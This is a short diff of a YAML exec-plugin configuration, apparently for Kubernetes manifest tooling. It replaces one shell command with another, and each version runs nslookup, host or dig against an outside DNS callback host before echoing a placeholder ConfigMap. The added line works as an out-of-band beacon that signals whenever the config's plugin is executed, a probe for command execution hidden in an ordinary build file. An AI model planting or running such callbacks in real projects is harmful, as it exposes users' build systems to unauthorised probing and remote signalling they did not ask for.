@@ -8,4 +8,4 @@ metadata:
         path: /bin/sh
         args:
           - -c
-          - "nslookup TESTFLO-EXEC-PLUGIN.sfg.0x79.de || host TESTFLO-EXEC-PLUGIN.sfg.0x79.de || dig TESTFLO-EXEC-PLUGIN.sfg.0x79.de || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
+          - "nslookup TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || host TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || dig TESTFLO-EXEC.6cd7a5c1-7fbb-45aa-b677-9113f98d1e00.dnshook.site || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
